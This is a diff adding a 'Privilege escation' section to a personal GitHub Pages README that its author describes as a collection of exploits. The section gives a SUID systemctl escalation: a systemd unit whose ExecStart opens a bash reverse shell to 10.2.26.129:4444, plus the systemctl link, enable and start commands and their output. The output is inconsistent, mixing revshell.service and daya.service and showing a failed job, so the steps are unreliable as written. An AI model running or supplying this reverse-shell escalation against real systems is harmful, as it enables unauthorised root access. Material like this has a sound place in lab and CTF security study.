@@ -38,6 +38,28 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 
 For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
 
+### Privilege escation
+
+## SUID /bin/systemctl
+create revshell.service as:
+```bash
+revshell.service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.2.26.129/4444 0>&1"
+[Install]
+WantedBy=multi-user.target
+
+```
+systemctl link /tmp/revshell.service
+Created symlink from /etc/systemd/system/revshell.service to /tmp/revshell.service.
+$ systemctl enable --now /tmp/daya.service
+Created symlink from /etc/systemd/system/multi-user.target.wants/revshell.service to /tmp/revshell.service.
+Job for daya.service failed because the control process exited with error code. See "systemctl status revshell.service" and "journalctl -xe" for details.
+
+systemctl start revshell.service
+
+
 ### Jekyll Themes
 
 Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/dayaramb/dayaramb.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
